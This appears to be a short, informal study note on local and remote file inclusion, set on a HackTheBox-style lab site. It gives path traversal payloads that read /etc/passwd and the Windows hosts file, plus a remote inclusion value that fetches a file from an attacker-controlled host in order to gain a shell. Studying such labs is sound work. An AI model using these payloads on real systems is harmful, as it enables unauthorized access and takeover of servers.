file include for example ==../../../../etc/passwd==

lets say a website with an url `unka.htb` 
their is an option on the website to change the language of the wole website. 
after hitthing that button the url changed into this 

http://unika.htb/index.php?page=german.html

==german.html== is actually a file that is being included in the variable called ==page==.
that means their are chances for file inclusion vulnerability.

[^1]: File inclusion vulnerability depends on this thing

it might be possible if use this script instead of german.html in the page value
```
../../../../../../../../windows/system32/drivers/etc/hosts
```

# remote file inclusion
by using this script in the page value attacker can get access to this website
```
//10.10.14.6/somefile
```
this is will download the somefile from the server 10.10.14.6 and could result in creating a ==backdoor== or a ==shell access== in the target server.
